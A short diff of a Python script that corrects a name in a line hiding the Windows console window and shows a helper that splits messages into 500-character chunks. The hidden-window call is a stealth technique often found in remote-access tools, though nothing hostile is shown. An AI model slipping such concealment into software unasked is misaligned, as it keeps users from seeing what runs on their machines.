@@ -6,7 +6,7 @@ import json
 import time
 from base64 import b64decode
 
-ct.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+ct.windll.user32.ShowWindow(ct.windll.kernel32.GetConsoleWindow(), 0)
 
 def split_message(message, max_length=500):
     return [message[i:i+max_length] for i in range(0, len(message), max_length)]
